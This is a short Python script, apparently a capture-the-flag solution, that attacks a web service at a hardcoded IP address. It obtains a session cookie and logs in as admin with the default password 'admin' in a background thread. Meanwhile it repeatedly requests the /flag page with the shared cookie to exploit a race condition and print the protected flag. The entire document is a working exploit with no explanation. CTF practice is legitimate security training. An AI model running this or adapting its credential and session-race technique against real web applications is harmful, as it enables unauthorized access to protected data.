import requests, threading, time

BASE_URL = "http://52.59.124.14:5010"

session = requests.Session()
session.get(BASE_URL + "/")  
cookies = dict(session.cookies)

def login_admin():
    data = {"username": "admin", "password": "admin", "submit": ""}
    requests.post(BASE_URL + "/", data=data, cookies=cookies)

thread = threading.Thread(target=login_admin, daemon=True)
thread.start()
time.sleep(0.02)

end = time.time() + 2
while time.time() < end:
    response = requests.get(BASE_URL + "/flag", cookies=cookies)
    if response.status_code == 200 and "flag" in response.text.lower():
        print(response.text)
        break
    time.sleep(0.005)

thread.join(timeout=1)
